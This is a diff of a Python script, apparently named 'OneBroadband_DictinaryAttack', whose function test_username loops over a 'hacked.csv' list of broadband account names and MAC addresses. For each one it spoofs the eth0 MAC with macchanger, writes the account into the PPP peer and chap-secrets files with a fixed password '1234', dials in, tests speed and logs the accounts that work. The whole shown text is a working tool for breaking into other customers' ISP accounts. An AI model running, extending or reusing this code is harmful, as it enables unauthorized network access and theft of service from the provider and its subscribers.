@@ -53,28 +53,35 @@ def test_speed():
 
 
 def test_username():
-    for i in open('hacked.csv', 'r').readlines():
-        account = i.split(',')
-        os.system('poff')
-        os.system('ifconfig eth0 down')
-        os.system(f'macchanger -m {account[1]} eth0')
-        os.system('ifconfig eth0 up')
-        with open('/etc/ppp/peers/dsl-provider', 'w') as f:
-            f.write(dsl.format(account[0]))
-        with open('/etc/ppp/chap-secrets') as f:
-            f.write(f'"{account[0]}" * "1234')
-        os.system('pon dsl-provider')
-        retry = 5
-        connected = False
-        connected_account: str
-        while connected != True & retry > 0:
-            try:
-                speed = test_speed()
-                write('succesfull.csv', f'{i[:-1]},{speed}\n')
-                connected = True
-            except:
-                time.sleep(10)
-                retry = retry - 1
+    dict_path = input('Enter the dictionary filepath: ')
+    if os.path.isfile(dict_path):
+        for i in open('hacked.csv', 'r').readlines():
+            account = i.split(',')
+            print(str(account))
+            os.system('poff -a')
+            os.system('ifconfig eth0 down')
+            os.system(f'macchanger -m {account[1]} eth0')
+            os.system('ifconfig eth0 up')
+            with open('/etc/ppp/peers/dsl-provider', 'w') as f:
+                f.write(dsl.format(account[0]))
+            with open('/etc/ppp/chap-secrets','w') as f:
+                f.write(f'"{account[0]}" * "1234"')
+            os.system('pon dsl-provider')
+            time.sleep(15)
+            
+            retry = 5
+            connected = False
+            connected_account: str
+            while connected != True & retry > 0:
+                try:
+                    speed=test_speed()
+                    write('/home/pi/OneBroadband_DictinaryAttack/succesfull.csv', f'{i[:-1]},{speed}\n')
+                    connected = True
+                    print(f'{account[0]} {speed}')
+                except Exception as e:
+                    time.sleep(10)
+                    retry = retry - 1
+                    print(e)
 
 
 def switch_connection():
